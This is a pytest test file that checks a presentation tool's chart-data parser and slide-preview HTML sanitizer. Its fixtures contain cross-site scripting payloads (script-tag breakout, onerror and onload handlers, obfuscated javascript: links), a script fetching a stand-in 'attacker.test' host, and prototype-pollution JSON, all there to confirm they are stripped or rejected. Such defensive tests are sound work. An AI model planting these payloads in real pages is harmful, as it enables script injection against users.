"""Generated charts are bounded data; server previews never execute model code."""
import json
import re

import pytest

from utils.smart_chart_data import chart_data_script, parse_smart_chart_data
from utils.smart_preview_safety import sanitize_slide_preview_html


def _charts():
    return {"chart-ab12cd": {"type": "bar", "data": {"labels": ["A", "B"], "datasets": [{"data": [10, 20]}]}}}


def test_chart_data_forces_noninteractive_renderer_options_and_escapes_html():
    charts = _charts()
    charts["chart-ab12cd"]["data"]["labels"] = ["</script><img src=x onerror=alert(1)>"]
    charts["chart-ab12cd"]["options"] = {"responsive": True, "animation": True, "events": ["click"]}
    charts["chart-ab12cd"]["plugins"] = ["untrusted-plugin"]
    result = parse_smart_chart_data(json.dumps(charts))
    assert result["chart-ab12cd"]["options"] == {"responsive": False, "animation": False, "events": []}
    assert "plugins" not in result["chart-ab12cd"]
    script = chart_data_script(result)
    assert script.count("</script>") == 1
    assert "\\u003c/script>" in script


@pytest.mark.parametrize("payload", [
    '{"chart-a":{"type":"bar","data":{"datasets":[{"data":[NaN]}]}}}',
    '{"chart-a":{"type":"bar","data":{"datasets":[{"data":[1]}]},"__proto__":{}}}',
    '{"chart-a":{"type":"bar","type":"line","data":{"datasets":[{"data":[1]}]}}}',
    json.dumps({"chart-a": {"type": [], "data": {"datasets": [{"data": [1]}]}}}),
    json.dumps({"chart-a": {"type": "bar", "data": {"datasets": [{"data": list(range(2001))}]}}}),
    json.dumps({"chart-a": {"type": "bar", "data": {"datasets": [{"data": [10 ** 400]}]}}}),
])
def test_chart_data_rejects_invalid_or_unbounded_payloads(payload):
    with pytest.raises(ValueError):
        parse_smart_chart_data(payload)


def test_sanitizer_strips_active_html_and_legacy_scripts_preserving_chart_json():
    source = '<section class="relative"><h1>Title &amp; facts</h1>' + (
        '<script>fetch("https://attacker.test")</script><script>new Chart(canvas, {});</script>'
        '<svg onload="alert(1)"><foreignObject><iframe srcdoc="evil"></iframe></foreignObject>'
        '<path d="M0 0 L10 10" stroke="red" /></svg>'
        '<img src="/app_data/safe.png" onerror="alert(1)">'
        '<a href="java&#10;script:alert(1)">Link</a>'
        '<div style="background: url(javascript:alert(1))">Text</div>'
        '<canvas id="chart-ab12cd" width="600" height="300"></canvas>'
    ) + chart_data_script(_charts()) + '</section>'
    clean = sanitize_slide_preview_html(source)
    assert "fetch(" not in clean and "new Chart(" not in clean
    assert "onerror" not in clean and "onload" not in clean
    assert "iframe" not in clean.lower() and "foreignobject" not in clean.lower()
    assert "javascript:" not in clean and "java\nscript:" not in clean
    assert '<path d="M0 0 L10 10" stroke="red"></path>' in clean
    assert '<img src="/app_data/safe.png">' in clean
    assert '<h1>Title &amp; facts</h1>' in clean
    assert clean.count('<script') == 1
    assert 'data-presenton-charts' in clean


def test_sanitizer_closes_incomplete_markup_and_drops_invalid_chart_data():
    clean = sanitize_slide_preview_html('<section><div>Safe<script type="application/json" data-presenton-charts>{bad}</script>')
    assert clean == '<section><div>Safe</div></section>'


def test_generated_chart_json_passes_normalization_without_javascript(monkeypatch):
    from utils.llm_calls import generate_smart_presentation as smart
    monkeypatch.setattr(smart, "_validate_smart_slide_layout_safety", lambda *_args, **_kwargs: None)
    source = '<section class="relative h-[720px] w-[1280px] overflow-hidden"><canvas id="chart-ab12cd"></canvas>' + chart_data_script(_charts()) + '</section>'
    result = smart.normalize_smart_slide_html(source)
    assert 'data-presenton-charts' in result
    assert 'new Chart' not in result


def test_preview_only_executes_fixed_nonce_scripts(monkeypatch):
    from templates import fonts_and_slides_preview as preview
    monkeypatch.setattr(preview, "absolute_fastapi_asset_url", lambda path: "https://studio.test" + path)
    source = '<section><script>window.compromised=true</script><canvas id="chart-ab12cd"></canvas></section>' + chart_data_script(_charts())
    result = preview._build_slide_preview_html(source, "")
    assert "window.compromised" not in result
    assert 'Content-Security-Policy' in result
    assert 'new window.Chart(canvas, config)' in result
    nonce_scripts = re.findall(r'<script nonce="([^"]+)"', result)
    assert len(nonce_scripts) == 4 and len(set(nonce_scripts)) == 1
    assert 'connect-src &#x27;none&#x27;' in result
    assert 'data-presenton-charts' in result
